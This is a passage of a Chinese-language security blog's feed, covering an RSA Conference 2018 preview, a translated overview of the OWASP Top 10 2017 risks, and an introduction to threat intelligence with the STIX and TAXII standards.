上预留一个录音棚来录制采访或现场新闻报道。多个广播电台还将设立各自的展台，记录对网络安全专家的专访。</p><p>另一个亮点是<strong>晚间 Ninja 系列会议</strong>，在周二（4 月 17 日）和周三（4 月 18 日）晚上 6 点半开始举行，主要探讨隐私与安全、网络可用性和可扩展性战略等充满挑战的技术解决方案。</p><p>最后，是作为 AdvancedU 一部分的 <strong>RSAC onDemand 计划</strong>。无法参加 RSAC 的个人而言可以利用这个珍贵的机会，选择实时对话和按需录制，第一时间了解大会详情。这个计划主要是针对没有时间或没有财力前往现场、但又对网络安全非常感兴趣的人，为他们提供学习机会。</p><p><img src="http://image.3001.net/images/20180413/15236075766305.jpg" alt=""></p><h3 id="重点议题"><a href="#重点议题" class="headerlink" title="重点议题"></a>重点议题</h3><h4 id="The-Hugh-Thompson-Show-人工智能主题"><a href="#The-Hugh-Thompson-Show-人工智能主题" class="headerlink" title="The Hugh Thompson Show 人工智能主题"></a>The Hugh Thompson Show 人工智能主题</h4><p>2018 年 4 月 20 日 13:00</p><p>人工智能是敌是友？是救世主还是恶魔？是机遇还是危险？这都取决于人类对于人工智能的应用方式及使用目的。</p><p>安全专家、RSA 会议计划委员会主席休·汤普森博士将与 Dawn Song 博士（加州大学伯克利分校电子工程与计算机科学系教授），Kate Darling 博士（机器人伴侣、人机交互，机器人伦理、知识产权理论与政策，麻省理工学院媒体实验室）和 Sebastian Thrun 博士（Udacity 创始人兼总裁）一起探讨人工智能的多层次内容，包括人工智能的应用及其可能对人性带来的帮助或伤害。</p><h4 id="信息安全行业的过去、现在与未来"><a href="#信息安全行业的过去、现在与未来" class="headerlink" title="信息安全行业的过去、现在与未来"></a>信息安全行业的过去、现在与未来</h4><p>2018 年 4 月 17 日 9:20</p><p>RSA 首席技术官 Zulfikar Ramzan、Signal 创始人 Moxie Marlinspike、MIT 研究院教授 Ronald Rivest、以色列 Weizmann 研究院计算机科学教授 Adi Shamir、Cryptomathic 公司密码学家与安全专家 Whitfield Diffie 以及安全研究员与顾问 Paul Kocher 等行业创始人与专家将围绕信息安全行业的发展各抒己见。</p><h4 id="五种最危险的新攻击技术及其未来趋势"><a href="#五种最危险的新攻击技术及其未来趋势" class="headerlink" title="五种最危险的新攻击技术及其未来趋势"></a>五种最危险的新攻击技术及其未来趋势</h4><p>2018 年 4 月 18 日11:15</p><p>来自 SANS 研究所的安全小组成员、美国顶级黑客 Ed Skoudis、Internet Storm Center 负责人 Johannes Ullrich、英国网络攻击研究专家 James Lyne 以及 SANS 研究所主任兼创始人 Alan Paller（本次主题研讨会主持人）将共同探讨当前最新的攻击技术，探讨攻击技术的实现过程、应对方式以及未来相应的防范措施。</p><h4 id="美国国土安全部部长-Kirstjen-Nielsen-讲话与-CNBC采访"><a href="#美国国土安全部部长-Kirstjen-Nielsen-讲话与-CNBC采访" class="headerlink" title="美国国土安全部部长 Kirstjen Nielsen 讲话与 CNBC采访"></a>美国国土安全部部长 Kirstjen Nielsen 讲话与 CNBC采访</h4><p>2018 年 4 月 17 日 10:05-10:30</p><p>美国 DHS 部长 Kirstjen Nielsen 将介绍美国的网络安全战略以及保护本国公民和组织免受网络攻击、数据泄露和网络犯罪等恶意行动影响的措施。另外她还将接受 CNBC 记者的聊天式采访，探讨国土安全部应对新型网络威胁的举措。</p><h4 id="网络暴力的代价"><a href="#网络暴力的代价" class="headerlink" title="网络暴力的代价"></a>网络暴力的代价</h4><p>2018 年 4 月 18 日 16:25-16:50</p><p>公众演说家、作家及社会活动家 Monica Lewinsky 将会探讨网络暴力的话题，倡导更安全的社交媒体环境。</p><h4 id="其他演讲嘉宾"><a href="#其他演讲嘉宾" class="headerlink" title="其他演讲嘉宾"></a>其他演讲嘉宾</h4><blockquote><p>Akamai 首席安全官 Andy Ellis 和网络安全副总裁 Josh Shaul</p><p>RSA 总裁 Rohit Ghai</p><p>赛门铁克网络安全服务高级副总裁兼总经理 Samir Kapuria</p><p>Juniper 首席执行官 Rami Rahim</p><p>微软总裁 Brad Smith</p><p>思科首席安全和信任官员高级副总裁 John N. Stewart</p><p>McAfee 首席执行官 Christopher D. Young</p><p>IBM Security 总经理 Marc van Zadelhoff</p></blockquote><h3 id="CISO-最期待什么？"><a href="#CISO-最期待什么？" class="headerlink" title="CISO 最期待什么？"></a>CISO 最期待什么？</h3><h4 id="1-适合高管层级的威胁情报"><a href="#1-适合高管层级的威胁情报" class="headerlink" title="1. 适合高管层级的威胁情报"></a>1. 适合高管层级的威胁情报</h4><p>网络安全事件越来越多，业务高管团队对网络风险相关事务的了解也持续深化。CISO 需要获取网络攻击者的信息及相关攻击分析结论，并向董事会汇报。<strong>对于 CISO 而言</strong>，技术上的 IoC、漏洞 exploit或者恶意软件变种并不是重点，<strong>他们更关注攻击者是谁、攻击原因和目的是什么、攻击者所采取的战术、技术与程序（即 TTP），同时也需要收集、整理相关资料交给高管团队</strong>。</p><p>这些情报已经超出了基础网络攻击的范畴，因为 CISO 作为管理者，希望也需要更透彻地理解地下网络的动态、欺诈性网站、凭证失窃乃至第三方风险管理等内容，这些都会对整个组织机构的运作产生重大影响。</p><p>为了更好地获取相关信息，CISO 可以多关注 BitSight、Digital Shadows、Flashpoint 等厂商，了解他们在大会上的独到见解。</p><h4 id="2-集成化安全平台"><a href="#2-集成化安全平台" class="headerlink" title="2. 集成化安全平台"></a>2. 集成化安全平台</h4><p>很多 CISO 都在工作中持续推进合并及集成各类安全技术的项目。个别产品和独立的技术已经不再有吸引力，<strong>CISO 们更倾向于各类安全平台的整合</strong>。举例来说，他们希望未来看到更多的集成化威胁防御，而非具体的端点安全、恶意软件沙箱或机器学习等单个的技术。</p><p><strong>在后端层面，SOAPA（安全运营与分析平台架构）成为 CISO 的关注焦点</strong>。此类架构能够将 SIEM、UEBA、EDR 以及安全自动化与编排工具等不同运营工具结合起来，提供集成化的业务与服务。此外，异构架构、API以及开源软件等多样化的平台也是 CISO 们希望看到的选择。</p><h4 id="3-业务风险"><a href="#3-业务风险" class="headerlink" title="3. 业务风险"></a>3. 业务风险</h4><p>CISO 在业务规划与战略制定过程中的参与度越来越高，以确保能够评估风险、实施控制并进行风险管理。RSA 大会原本不太关注风险管理，但是会探讨数字化转型、物联网安全以及 NIST（美国国家标准与技术研究所）网络安全框架等相关议题。</p><h4 id="4-不断变化的安全边界"><a href="#4-不断变化的安全边界" class="headerlink" title="4. 不断变化的安全边界"></a>4. 不断变化的安全边界</h4><p>几乎每一位 CISO 都在讨论移动与云技术对旧有网络边界的颠覆性影响。如今，众多企业正在将身份认证与数据安全视为不断拓展的新边界。RSA 大会在这方面主要进行理论性（与 GDPR、即通用数据保护条例相关）的探讨。其中，身份讨论将围绕多因素身份验证与软件定义边界（SDP、Cyxtera、谷歌以及 Zscaler等为代表）开展，数据安全讨论则将集中在数据丢失保护（以 Digital Guardian、Forcepoint、赛门铁克等公司为代表）以及加密层面的内容。</p><p><strong>作为管理者，CISO 更关注人员与流程，而非技术因素</strong>。目前，70% 的企业表示受到安全技术能力短缺的影响。也希望以后的行业大会能在技术之外，更多地关注这些方面。</p><p><img src="http://image.3001.net/images/20180413/1523607781799.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;一年一度的 RSA 大会（美国信息安全大会）将于当地时间 4 月 16 日到 4 月 20 日在美国旧金山举行。作为圈内影响力较大的会议，RSA 每年的议题和环节都有值得关注的亮点。今年预计有 500 家安全厂商参展，而参会者将有望突破 4 万人。
      
    
    </summary>
    
      <category term="技术" scheme="https://github.com/zhililab/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="RSA" scheme="https://github.com/zhililab/tags/RSA/"/>
    
  </entry>
  
  <entry>
    <title>OWASP TOP 10 - 2017 Part 1</title>
    <link href="https://github.com/zhililab/2018/04/13/OWASP-Top10-2017/"/>
    <id>https://github.com/zhililab/2018/04/13/OWASP-Top10-2017/</id>
    <published>2018-04-13T06:26:10.000Z</published>
    <updated>2018-06-03T09:05:58.650Z</updated>
    
    <content type="html"><![CDATA[<p>今天，我们来一起回顾下 <strong>2017年 OWASP TOP 10 安全风险报告</strong> 的主要内容，了解 2013  到 2017 全球安全风险发现了哪些变化？有哪些新兴风险类型？本文大部分内容翻译自 <a href="https://www.owasp.org/images/7/72/OWASP_Top_10-2017_%28en%29.pdf.pdf" target="_blank" rel="noopener">报告原文</a> ，如需阅读详情，请自行浏览访问 ~</p><blockquote><p>OWASP (Open Web Application Security Project) 是一个开源的、非盈利的全球性安全组织，致力于应用软件的安全研究。我们的使命是使应用软件更加安全，使企业和组织能够对应用安全风险作出更清晰的决策。目前OWASP全球拥有220个分部近六万名会员，共同推动了安全标准、安全测试工具、安全指导手册等应用安全技术的发展。</p></blockquote><p><strong>0x1 提要</strong></p><ul><li>更新: 2017 Top 10 主要更新在于添加了若干个新的问题，其中有两个是由社区中选出的 —— <strong>A8:2017-不安全反序列化</strong> 和 <strong>A10:2017-不充分的登陆和监控</strong> </li><li>来源: OWASP Top 10 - 2017 主要基于超过 40 个来自专注应用安全领域的公司和一份超过500人的行业调查报告得出。数据横跨成百上千的组织机构收集的漏洞和超过 100,000 真实应用和 APIs</li><li>编撰目的: 向<strong>开发者</strong>、<strong>设计师</strong>、<strong>架构师</strong>、<strong>经理</strong>和<strong>组织机构</strong>传播关于最常见和最重要网络应用安全风险的后果；同时提供一些基础技术指导 —— 保护这些高风险区域，提供现在开始着手处理的指南</li><li>风险确定: OWASP Top 10 聚焦于识别对广泛范围内的公司来说最严重的网络应用安全风险。对于每个风险，OWASP 都会使用简单评分模式，提供相关性和技术影响的基本信息</li></ul><p><strong>0x2 什么是应用安全风险</strong></p><p>攻击者们会通过你的应用使用多种潜在路径损害你的生意或组织。每条路径代表一个也许会或不会严重到引起注意的风险。</p><p><img src="http://f.cl.ly/items/1H2B1r2a0d2u27010b1X/What%20Are%20Application%20Security%20Risks.png" alt="What Are Application Security Risks?"></p><p><center> 图片来源: OWASP Top 10 - 2017 Report <center></center></center></p><ul><li>Threat Agents ——威胁来源</li><li>Attack Vectors —— 攻击载体</li><li>Security Weakness —— 安全薄弱点</li><li>Security Controls —— 安全控制</li><li>Technical Impacts —— 技术影响</li><li>Business Impacts —— 商业影响</li></ul><p>有时这些路径很容易找到和利用，有时候它们又极其困难。类似的，这种损害也许没造成实质结果，也可能让你破产。为了得到组织的风险情况，我们可以评估每个威胁来源、攻击载体等之间的相似性，并将它们和对你所在组织造成的技术、商业影响估值合并。这样，我们可以最终确定总体风险。</p><p><strong>0x3 Top 10 安全风险内容</strong></p><table><thead><tr><th style="text-align:center">Top N</th><th style="text-align:center">介绍</th></tr></thead><tbody><tr><td style="text-align:center">A1: 2017-Injection(注入攻击)</td><td style="text-align:center">注入攻击发生在不可信数据作为一条命令或查询的解析器被发送时，例如: SQL 、NoSQL、OS 和 LDAP 注入。攻击者的恶意数据可以迷惑解析器以执行非预设的命令或没有正确验证情况获取数据</td></tr><tr><td style="text-align:center">A2: 2017-Broken Authentication(验证破坏)</td><td style="text-align:center">认证和会话管理方面的应用功能经常得不到合规开发，这使得攻击者可以窃取密码、密钥或会话，又或者挖掘其他开发缺陷，暂时或永久地假设其他用户身份。</td></tr><tr><td style="text-align:center">A3: 2017-Sensitive Data Exposure(敏感数据暴漏)</td><td style="text-align:center">许多网页应用程序和 API 没有妥善地保护敏感数据 (e.g. 金融数据、医疗数据和 PII)。攻击者可以窃取或修改这些弱保护的数据，然后实施信用卡欺诈、身份窃取或进行其他犯罪行为。敏感数据没有得到额外措施保护情况 (e.g. 在存储或传输过程中加密、与浏览器交互时格外小心等)，可能会被窃取</td></tr><tr><td style="text-align:center">A4: 2017-XML External Entities (XXE)(XML 外部实体)</td><td style="text-align:center">很多老旧配置的 XML 处理器在 XML 文档内评估外部实体参考。外部实体可以通过使用文件 URI 处理程序、内部文件共享、内部端口扫描、远程代码执行和服务访问拒绝攻击的方式纰漏内部文件</td></tr><tr><td style="text-align:center">A5: 2017-Broken Access Control(失效的访问控制)</td><td style="text-align:center">对于认证用户行为权限的限制经常得不到完整的实施。攻击者可以挖掘这些缺陷去获得非授权的功能和 (或) 数据，例如访问其他用户账号、查看敏感文件、修改其他用户数据，更改访问权限等等</td></tr><tr><td style="text-align:center">A6: 2017-Security Misconfiguration(不安全的组态配置)</td><td style="text-align:center">安全配置不当是最常见的问题。这通常是由于不安全的默认设置、不完整或临时的配置，开放云存储，HTTP 头部错误配置和包含敏感信息的强制报告信息造成的。不仅所有操作系统、框架、库、应用程序需要安全配置，而且必须及时的打补丁和升级。</td></tr><tr><td style="text-align:center">A7: 2017-Cross-Site Scripting (XSS)(跨站点脚本攻击)</td><td style="text-align:center">XSS 缺陷发生情景: ① 应用程序在没有经过验证或溢出式在新网页加载非可信数据 ② 通过可以生成 HTML 或 JavaScript 代码的浏览器 API，应用程序使用用户数据更新网页时。XSS 使得攻击者可以在受害者的浏览器执行脚本，造成会话劫持、破坏网站或引导用户访问恶意网站。</td></tr><tr><td style="text-align:center">A8: 2017-Insecure Deserialization(不安全反序列化)</td><td style="text-align:center">不安全反序列化经常造成远程代码运行。有时尽管反序列化缺陷没有导致远程代码运行，但它们可以用于执行各种攻击，例如: 重播攻击、注入攻击和权限提升攻击。</td></tr><tr><td style="text-align:center">A9: 2017-Using Components with Known Vulnerabilities(使用组件已知的漏洞)</td><td style="text-align:center">各种组件 (例如: 库、框架和其他软件模块) 运行时与应用程序权限相同。如此一来，如果一个脆弱的组件被利用，这个攻击可以最终造成严重数据丢失或服务器被接管。使用已知漏洞组件的应用程序和 API 可能会降低应用的防范能力，造成各种各样的攻击和影响。</td></tr><tr><td style="text-align:center">A10: 2017-Insufficient Logging &amp; Monitoring(不足的日志记录和监测)</td><td style="text-align:center">当不充分的日志和监测与遗漏的或无效的事件响应凑在一起，攻击者就可以发动更深层次的系统攻击、保持持久性、转移攻击到更多的系统，并且篡改、窃取甚至破坏数据。大部分 breach 研究表明——检测到 breach 需要超过 200 天时间，而且通常还是外部机构检测出来而非内部处理或监测。</td></tr></tbody></table><p><strong>0x4 总结</strong></p><p>本篇我们介绍了OWASP组织、应用安全威胁相关内容、Top 10 风险内容，下次将会介绍 Top 10 安全威胁的常见攻击场景以及防范措施等内容，敬请期待 (☆▽☆)</p><p><strong>0x5 附录</strong></p><ol><li><a href="https://www.owasp.org/images/f/f8/OWASP_Top_10_-_2013.pdf" target="_blank" rel="noopener">OWASP Top 10 - 2013 Report</a></li><li><a href="https://www.owasp.org/images/7/72/OWASP_Top_10-2017_%28en%29.pdf.pdf" target="_blank" rel="noopener">OWASP Top 10 - 2017 Report</a></li><li><a href="https://www.acunetix.com/blog/articles/what-is-insecure-deserialization/" target="_blank" rel="noopener">What is Insecure Deserialization?</a></li></ol><p>未完待续….</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;今天，我们来一起回顾下 &lt;strong&gt;2017年 OWASP TOP 10 安全风险报告&lt;/strong&gt; 的主要内容，了解 2013  到 2017 全球安全风险发现了哪些变化？有哪些新兴风险类型？本文大部分内容翻译自 &lt;a href=&quot;https://www.owas
      
    
    </summary>
    
      <category term="技术" scheme="https://github.com/zhililab/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="OWASP" scheme="https://github.com/zhililab/tags/OWASP/"/>
    
  </entry>
  
  <entry>
    <title>威胁情报漫谈</title>
    <link href="https://github.com/zhililab/2018/04/08/CTI/"/>
    <id>https://github.com/zhililab/2018/04/08/CTI/</id>
    <published>2018-04-08T09:42:58.000Z</published>
    <updated>2018-06-04T05:03:59.919Z</updated>
    
    <content type="html"><![CDATA[<h3 id="威胁情报、分类及其作用"><a href="#威胁情报、分类及其作用" class="headerlink" title="威胁情报、分类及其作用"></a>威胁情报、分类及其作用</h3><h4 id="什么是威胁情报"><a href="#什么是威胁情报" class="headerlink" title="什么是威胁情报"></a>什么是威胁情报</h4><p>威胁情报，又被称为安全威胁情报，是一种关于潜在或正在发生的威胁组织安全的信息，是一种关于攻击对手自身、使用工具及相关技术的情报。威胁情报的核心目的在于帮助组织机构理解常见的、严重外部威胁的风险，提前做好预判，准备相应防范措施，最大程度的避免或减少由于外部网络威胁给组织机构带来的损失。</p><h4 id="威胁情报分类"><a href="#威胁情报分类" class="headerlink" title="威胁情报分类"></a>威胁情报分类</h4><p>同时，威胁情报一词涵盖范围太广，无法准确传递，我们需要对威胁情报进行分类，这里列举两种——基于用途的分类和基于数据类型的分类。</p><p><img src="http://f.cl.ly/items/132G08270226343M3F1I/Image%202018-04-08%20at%207.04.08%20PM.png" alt="威胁情报分类"></p><ul><li><p>基于用途的分类</p><ul><li>归属指标：指向一个或多个(分布式、大规模）网络攻击的来源，是 A 发起了攻击或入侵。</li><li>检测指标：指向一个网络攻击事件，例如 “这个网页脚本包含一个注入攻击”</li><li>指向指标：指向一个或多个可能会被列为攻击目标的用户、设备等。</li><li>预测指标：指向一个或多个预测的可能发生的后续攻击事件。例如，安全数据分析工作职责之一是需要负责网络与系统的安全监控，安全日志分析,利用大数据技术，对黑客攻击行为的分析。</li></ul></li></ul><ul><li><p>基于数据类型的分类(级别：一级 –&gt; 六级， 价值：低 –&gt; 高）</p><ul><li>HASH 值(一级）：SHA1 或 MD5 是比较常见的 Hash 值例子。这里威胁情报的 Hash 值主要对应于入侵相关的特定样本/文件。</li><li>IP 地址(二级）：IP 地址是比较常见的指标，但也是最容易被改变或伪装的指标。例如：一场大型 DDoS 攻击可能会产生成千上万个 IP 地址，单纯利用 IP 地址追溯源头效果甚微。 </li><li>域名(三级）：域名指标相对 IP 地址较为固定，若想要更改则需要付出相对于 IP 地址高很多的代价(e.g. 域名变更、域名注册）</li><li>网络或主机特征(四级）：当获取到这个层面的威胁情报信息会让攻击对手感到一定程度的不适，因为他们往往需要重新配置或编译他们的攻击工具/脚本。</li><li>攻击工具(五级）：感知到这个层面的威胁情报相当获取攻击者们使用“武器”的具体信息(e.g. 攻击技术、攻击工具），安全工程师可以提前/立刻采取相对应的防范措施，部署防御工具/策略，进一步推测类似的攻击工具/手段，提前做制定响应预案和应对措施。</li><li>TTPs(六级）：TTPs 是 Tactics / Techniques / Procedures 的对应缩写组合，这个级别的威胁情报也是等级最高、价值最大的。这时候，威胁情报分析师、安全工程师等关注的不在如何获取攻击者的攻击工具或是应对相应的攻击工具，而是直接、明确、果断、快速应对攻击者的技能集(Skills Sets）。一旦到达了这个级别，攻击者为了继续发动有效的攻击、产生破坏，往往不得不去 get√ 新的技能(e.g. 工具/技术/攻击手法），无疑会耗费大量时间/精力。</li></ul></li></ul><blockquote><p>威胁情报基于不同用途、数据类型划分了不同的类别，但威胁情报划分远不止这些。就个人而言，威胁情报基于组织机构相关程度，可以划分为无关情报、相关情报、密切相关情报；基于时间周期，还可以划分为初期情报、阶段性情报(中前期、中期、中后期）、总结性情报…</p></blockquote><h4 id="作用-价值"><a href="#作用-价值" class="headerlink" title="作用/价值"></a>作用/价值</h4><p>威胁情报的价值：</p><p>✔ 以可视化的方式为企业提前审视系统漏洞提供参考</p><p>✔ 提高组织应对潜在威胁的响应速度，减少损失</p><p>✔ 帮助企业决策针对即将发生或当下发生的威胁，部署风险管理策略和资源分配</p><h3 id="常用协议、标准和框架"><a href="#常用协议、标准和框架" class="headerlink" title="常用协议、标准和框架"></a>常用协议、标准和框架</h3><p>为了便于各大白帽、安全公司、安全联盟等组织/机构/个人，共享威胁情报，形成自动化、智能化的安全威胁情景感知、实时网络攻击/威胁和复杂威胁分析的情报平台/系统，逐渐出现了一些威胁情报框架和标准，这里列举若干主流的、代表的、使用多的威胁情报框架或标准。</p><h4 id="STIX™-Structured-Threat-Information-Expression"><a href="#STIX™-Structured-Threat-Information-Expression" class="headerlink" title="STIX™ (Structured Threat Information Expression)"></a>STIX™ (Structured Threat Information Expression)</h4><p><strong>介绍</strong></p><p>下面是翻译自 <a href="https://oasis-open.github.io/cti-documentation/" target="_blank" rel="noopener">OASIS-OPEN</a> 官网的关于 STIX™ 的介绍：</p><p>STIX 是一种用于交换(exchange）安全威胁情报的语言和序列化格式。STIX 是完全开源的、任何相关人员都可以参与进行一起完善 STIX 标准本身 ➿</p><p>STIX 使得组织机构之间以一种持续不间断、自动机读方式共享安全威胁情报，安全社区更好的了解他们最有可能遇到的电脑攻击类型，从而更快速、更高效地处理应对攻击 🤖</p><p>STIX 设计之初是为了提高威胁情报方面的各项机能，例如：协同威胁分析、自动威胁情报共享、自动检测和应对等等 🎯</p><p><strong>内容和构成</strong></p><p>STIX 2 对象类化了拥有详细属性的每条情报，通过关系连接后的多个对象允许安全威胁情报可以以简单或复杂的形式表征。下面的列表是通过 STIX 可以表示的信息。</p><p>首先，STIX 2 定义了 12 种 STIX 域对象 (SDOs):</p><table><thead><tr><th style="text-align:center">名称</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">攻击模式 (Attack Pattern)</td><td style="text-align:center">一类 TTP ，用来描述威胁发动者尝试破坏目标的方式</td></tr><tr><td style="text-align:center">活动 (Campaign)</td><td style="text-align:center">一组对抗行为，用来描述一段时间内针对一系列特定目标发动的一连串恶意活动或攻击</td></tr><tr><td style="text-align:center">行动内容 (Course of Action)</td><td style="text-align:center">一种用来预防攻击或应对攻击的行动</td></tr><tr><td style="text-align:center">主体 (Identity)</td><td style="text-align:center">个人、组织或团体，也可以是个人、组织或团体的派别</td></tr><tr><td style="text-align:center">指标 (Indicator)</td><td style="text-align:center">包含一个可以用来检测可以或恶意安全活动的特诊</td></tr><tr><td style="text-align:center">入侵集 (Intrusion Set)</td><td style="text-align:center">一系列抱团形式的对抗行为和资源，它们具有一些被认为是由单个威胁者精心策划的显著特征</td></tr><tr><td style="text-align:center">恶意软件 (Malware)</td><td style="text-align:center">一类 TTP，也叫恶意代码或恶意软件，用于破坏受害者数据或系统的保密性、完整性和可用性</td></tr><tr><td style="text-align:center">监测数据 (Observed Data)</td><td style="text-align:center">传递关于攻击系统的网络的信息 (e.g. IP 地址)</td></tr><tr><td style="text-align:center">报告 (Report)</td><td style="text-align:center">聚焦单一或更多主题的威胁情报聚合，例如关于威胁者、恶意软件或攻击技术，包括上下文细节的一个描述</td></tr><tr><td style="text-align:center">威胁者 (Threat Actor)</td><td style="text-align:center">怀揣恶意目的的个人、团体或组织</td></tr><tr><td style="text-align:center">工具 (Tool)</td><td style="text-align:center">威胁者发动攻击可以使用的正当软件</td></tr><tr><td style="text-align:center">漏洞 (Vulnerability)</td><td style="text-align:center">黑客可以用以获得系统或网络权限的软件缺陷</td></tr></tbody></table><p>其次，STIX 2 定义了 2 种 STIX 关系对象 (SROs):</p><table><thead><tr><th style="text-align:center">名称</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">关系 (Relationship)</td><td style="text-align:center">用于连接两个 SDOs ，描述连接方式</td></tr><tr><td style="text-align:center">见证 (Sighting)</td><td style="text-align:center">表示 CTI 的一个元素被监测到的信念 (e.g. 指标、恶意软件)</td></tr></tbody></table><p>STIX 2 对象以 <strong>JSON</strong> 格式表示，下面是一个 STIX 2 活动对象示例:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"type"</span>: <span class="string">"campaign"</span>,  </span><br><span class="line">    <span class="attr">"id"</span>: <span class="string">"campaign--8e2e2d2b-17d4-4cbf-938f-98ee46b3cd3f"</span>,  </span><br><span class="line">    <span class="attr">"created"</span>: <span class="string">"2016-04-06T20:03:00.000Z"</span>,  </span><br><span class="line">    <span class="attr">"name"</span>: <span class="string">"Green Group Attacks Against Finance"</span>,  </span><br><span class="line">    <span class="attr">"description"</span>: <span class="string">"Campaign by Green Group against targets in the financial services sector."</span>  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个 STIX 2 活动对象，清晰的展示了攻击活动的类型、名称等字段，其中类型和名称属性是必须有的 (required)，其他属性选择性添加 (optional)。</p><p>最后，这里放出一个 <a href="https://www.youtube.com/channel/UCmW_oi_zce3On4LyK9KDnfg" target="_blank" rel="noopener">FreeTAXII Project</a> 制作的 STIX 2 对象介绍视频:</p><iframe width="560" height="315" src="//player.bilibili.com/player.html?aid=22063175&cid=36472059&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe><h4 id="TAXII™-Trusted-Automated-Exchange-of-Intelligence-Information"><a href="#TAXII™-Trusted-Automated-Exchange-of-Intelligence-Information" class="headerlink" title="TAXII™ (Trusted Automated Exchange of Intelligence Information)"></a>TAXII™ (Trusted Automated Exchange of Intelligence Information)</h4><p><strong>介绍</strong></p><p>下面是翻译自 <a href="https://oasis-open.github.io/cti-documentation/" target="_blank" rel="noopener">OASIS-OPEN</a> 官网的关于 TAXII™ 的介绍：</p><p>TAXII 是一种简单、可拓展的安全威胁情报交流 (communication) 的应用层协议 📜</p><p>TAXII 协议用于在 HTTPS 交换安全威胁情报。使用 TAXII 协议，组织机构可以通过定义符合通用共享模型的 API 方便高效地共享安全威胁情报 👌</p><p>TAXII 协议专为支持以 STIX 语言表示的安全威胁情报交换设计 ⛽</p><p><strong>内容和构成</strong></p><p>TAXII 定义了 RESTful API (一系列服务和消息交换) 和一系列 TAXII 客户端和服务器的要求。如下图，TAXII 定义了两个主要服务以支持多种多样的通用共享模型:</p><ul><li><strong>集合(Collection)</strong> — 一个集合是 CTI 对象的逻辑库的接口，它由 TAXII 服务器提供，允许情报生产者握持一系列可以由情报消费者获取的 CTI 数据: TAXII 客户端和服务器通过“请求-响应”模型交换信息。</li><li><strong>通道 (Channel)</strong> — 一个通道允许情报生产者推送给大量消费者数据，消费者也可以从大量生产者那里接收数据，这个通道由 TAXII 服务器负责维护: TAXII 客户端和其他客户端通过“发布-订阅”模型交换信息。注意: TAXII 2.0 说明书保留了通道必须的关键字，但并未指定通道的服务。通道和他们的服务将会在 TAXII 稍后版本中的明确。</li></ul><p><img src="http://f.cl.ly/items/2f1X1D1M172J202d3N23/taxii_diagram2.png" alt="TAXII Architecture"></p><p>集合和通道可以用不同的方式组织。例如：它们可以组合在一起以支持某一特定信赖团体的需求。</p><p>一个 TAXII 服务器实例可以支持一个或多个 API Roots。API Roots 是 TAXII 通道和集合的逻辑组合，可以被认为是在不同 URL 可用时的 TAXII API 的实例 (这里每个 API Root 是TAXII API 的特定实例的”根” URL) 。</p><p>TAXII 尽可能的依赖现有的协议，尤其当通过 DNS 服务记录发现 TAXII 服务器在同一网络内时。此外，TAXII 使用 HTTPS 作为所有通信的传输协议，并使用 HTTP 作为内容协商和认证的协议。</p><p>TAXII 经过精心设计，支持 STIX 格式的 CTI 交换，并且支持 STIX 2.0 内容交换是强制要求实现的。然而，TAXII 也可以共享以其他格式记录的数据。STIX 和 TAXII 是相互独立的标准：STIX 的结构和序列化不需要以来任何特定的传输机制，而且 TAXII 可以用于传输非 TAXII 数据 (<strong>这里划重点！这里划重点！这里划重点！</strong>)</p><p><strong>TAXII 设计原则</strong></p><ol><li>包括采纳需要最小化修改原则</li><li>便于与现有共享协议集成原则</li><li>支持所有广泛使用的威胁共享模式: hub-and-spoke, peer-to-peer, source-subscriber</li></ol><p>Plus: 关于 TAXII 2.0 详细介绍和使用说明，可以参阅 ☞ <a href="https://oasis-open.github.io/cti-documentation/resources.html#taxii-20-specification" target="_blank" rel="noopener">TAXII 2.0 官方说明文档</a></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>本篇我们了解威胁情报的基本概念、分类和作用，然后介绍了威胁情报常用表示标准 (e.g. STIX) 和 传输协议 (e.g. TAXII) ，感兴趣的小伙伴们可以自行搜索相关资料深入阅读。</p><ul><li>CTI – Cyber Threat Intelligence 安全威胁情报</li><li>STIX™ – Structured Threat Information Expression 结构化威胁情报交换语言</li><li>TAXII™ – Trusted Automated Exchange of Intelligence Information 可信赖自动威胁情报交换协议</li></ul><p>📢 预告 —— 下次我们将介绍一些国内外知名的威胁情报服务提供商/企业。</p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://whatis.techtarget.com/definition/threat-intelligence-cyber-threat-intelligence" target="_blank" rel="noopener">TechTarget - Threat Intelligence (Cyber Threat Intelligence)</a></li><li><a href="http://netsecurity.51cto.com/art/201507/483312.htm" target="_blank" rel="noopener">小议安全威胁情报之分类和使用场景</a></li><li><a href="https://oasis-open.github.io/cti-documentation/taxii/intro.html" target="_blank" rel="noopener">Introduction to TAXII</a></li></ul><hr>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;威胁情报、分类及其作用&quot;&gt;&lt;a href=&quot;#威胁情报、分类及其作用&quot; class=&quot;headerlink&quot; title=&quot;威胁情报、分类及其作用&quot;&gt;&lt;/a&gt;威胁情报、分类及其作用&lt;/h3&gt;&lt;h4 id=&quot;什么是威胁情报&quot;&gt;&lt;a href=&quot;#什么是威胁情报&quot; c
      
    
    </summary>
    
      <category term="技术" scheme="https://github.com/zhililab/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="威胁情报" scheme="https://github.com/zhililab/tags/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>Git 使用入门（2）</title>
    <link href="https://github.com/zhililab/2018/04/07/GitSecondImpression/"/>
    <id>https://github.com/zhililab/2018/04/07/GitSecondImpression/</id>
    <published>2018-04-07T08:23:08.000Z</published>
    <updated>2018-06-04T05:06:19.594Z</updated>
    
